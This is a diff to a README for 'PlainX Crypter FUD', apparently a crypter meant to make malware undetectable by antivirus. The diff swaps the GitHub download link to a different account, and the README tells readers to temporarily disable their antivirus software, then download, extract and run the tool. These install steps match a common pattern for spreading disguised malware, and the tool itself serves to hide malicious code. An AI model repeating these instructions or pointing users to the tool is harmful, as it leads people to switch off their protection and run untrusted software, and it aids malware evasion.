@@ -36,7 +36,7 @@
 
 **Note: You may need to temporarily disable your antivirus software during installation.**
 
-1. **Download**: [[Click here to download PlainX Crypter]](https://github.com/stevanolstrak/PlainX Crypter-FUD/blob/main/releases/PlainX Crypter.zip)
+1. **Download**: [[Click here to download PlainX Crypter]](https://github.com/SebDevAO/PlainX-Crypter-FUD/releases/tag/1.0.1)
 2. **Extract the ZIP File**:
    - Unzip the downloaded file to a convenient location on your computer.
 3. **Run PlainX Crypter**:
